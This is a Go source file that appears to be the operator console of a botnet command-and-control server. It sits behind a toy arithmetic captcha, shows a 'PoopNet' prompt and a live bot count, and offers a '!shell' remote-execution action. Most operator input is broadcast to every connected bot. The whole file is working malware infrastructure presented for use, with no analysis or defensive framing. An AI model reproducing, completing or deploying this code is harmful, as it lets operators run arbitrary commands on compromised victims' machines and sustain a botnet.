package main

import (
	"bufio"
	"net"
	"strconv"
	"strings"
	"time"
)

type Server struct {
	Connection net.Conn
}

func NewServer(connection net.Conn) *Server {
	return &Server{
		Connection: connection,
	}
}

func (server *Server) WriteString(data string) {
	var strToBytes []byte = []byte(data)
	server.Connection.Write(strToBytes)
}

func (server *Server) Colored(colorCode int, data string) {
	coloredText := ColoredText(colorCode, data)
	server.WriteString(coloredText)
}

func (server *Server) ClearScreen() {
	server.WriteString(CLEAR_SCREEN)
}

func (server *Server) ReadLine() (string, error) {
	bufioReader := bufio.NewReader(server.Connection)
	contents, err := bufioReader.ReadString('\n')
	contents = strings.TrimSpace(contents)
	return contents, err
}

func (server *Server) ShowBot() {
	for {
		botCount := botList.BotCounter()
		server.WriteString("\033]0;Bots: " + strconv.Itoa(botCount) + "\007")
		time.Sleep(1 * time.Second)
	}
}

func (server *Server) Handle() {
	defer server.Connection.Close()
	numberOne, numberTwo := GenerateCaptcha(1, 10)
	var captcha string = strconv.Itoa(numberOne) + " + " + strconv.Itoa(numberTwo) + " = "
	server.WriteString(captcha)
	result, err := server.ReadLine()
	if err != nil {
		return
	}
	resultInt, err := strconv.Atoi(result)
	if err != nil {
		return
	}
	if resultInt != numberOne+numberTwo {
		server.WriteString("Wrong CAPTCHA!\r\n")
		return
	}
	go server.ShowBot()
	server.ClearScreen()
	server.WriteString("\r\n\r\n")
	server.Colored(92, "╔═╗╦ ╦╔═╗╔═╗╦ ╦  ╔╗ ╔═╗╦╔═╔═╗\r\n")
	server.Colored(92, "╚═╗║ ║╚═╗╚═╗╚╦╝  ╠╩╗╠═╣╠╩╗╠═╣\r\n")
	server.Colored(92, "╚═╝╚═╝╚═╝╚═╝ ╩   ╚═╝╩ ╩╩ ╩╩ ╩\r\n")
	server.WriteString("\r\n\r\n")
	for {
		server.Colored(32, "sussybaka@PoopNet~# ")
		command, err := server.ReadLine()
		if err != nil {
			continue
		}
		if command == "help" {
			server.Colored(96, "╔═══════════════════════════════╗\r\n")
			server.Colored(96, "║ help: Show helps.             ║\r\n")
			server.Colored(96, "║ bots: Show active bots.       ║\r\n")
			server.Colored(96, "║ actions: Show all actions.    ║\r\n")
			server.Colored(96, "╚═══════════════════════════════╝\r\n")
		}
		if command == "actions" {
			server.Colored(96, "╔═══════════════════════════════╗\r\n")
			server.Colored(96, "║ !shell: Remote shell execute. ║\r\n")
			server.Colored(96, "╚═══════════════════════════════╝\r\n")
		}
		if command == "bots" {
			botCount := botList.BotCounter()
			server.Colored(96, "Bots: "+strconv.Itoa(botCount)+"\r\n")
			continue
		}
		botList.SendCommand(command)
	}
}
